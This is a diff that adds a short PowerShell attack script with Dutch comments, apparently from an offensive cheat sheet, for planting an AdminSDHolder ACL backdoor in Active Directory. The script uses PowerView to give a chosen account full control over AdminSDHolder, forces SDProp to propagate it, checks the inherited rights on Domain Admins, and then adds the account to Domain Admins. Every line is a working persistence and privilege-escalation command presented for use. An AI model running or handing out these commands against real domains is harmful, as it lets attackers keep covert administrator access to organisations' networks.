@@ -1,0 +1,9 @@
+# AdminSDHolder persistence - ACL backdoor (DA nodig)
+# Stap 1: FullControl toevoegen aan AdminSDHolder
+powershell -c "Import-Module .\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity targetuser -Rights All -Verbose"
+# Stap 2: SDProp forceren (normaal elke 60 min)
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+# Stap 3: Verifieer rechten op Domain Admins
+Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ?{$_.IdentityReferenceName -match "targetuser"}
+# Stap 4: Abuse - jezelf toevoegen aan Domain Admins
+Add-DomainGroupMember -Identity 'Domain Admins' -Members targetuser -Verbose
